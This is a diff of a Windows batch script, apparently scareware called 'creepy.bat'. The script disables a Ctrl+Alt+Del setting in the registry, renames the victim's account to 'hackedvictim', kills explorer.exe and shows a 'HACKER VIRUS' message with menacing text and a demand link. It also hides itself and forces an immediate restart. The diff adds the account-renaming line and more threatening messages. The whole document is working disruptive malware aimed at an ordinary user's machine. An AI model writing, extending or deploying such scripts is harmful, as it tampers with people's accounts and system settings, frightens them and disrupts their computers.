@@ -4,10 +4,11 @@
 
 :: setup registry keys before killing explorer
 reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCAD /t REG_DWORD /d 1
-
-:: set username secretly and before killing explorer
+cls
+:: set username secretly (not really) and before killing explorer
 wmic useraccount where name='%username%' set FullName='hackedvictim'
-
+wmic useraccount where name='%username%' rename='hackedvictim'
+cls
 taskkill /f /im explorer.exe
 cls
 echo ----HACKER VIRUS----
@@ -37,6 +38,6 @@ echo We will meet you soon, in 10 minutes, %username%... so always contribute to
 echo Heres the link to contribute: https://ahakers.com/contrib/victim > %userprofile%\desktop\ARCHERHACKERSDATA\contrib.txt
 :: DONT LISTEN TO THEM THIS IS FAKE LINK!!!
 attrib +s +h %userprofile%\desktop\creepy.bat
-echo Do you want to restart your computer? :)
+echo Do you want to restart your computer? :) There is a surprise... for you...
 pause
 shutdown /f /r /t 0
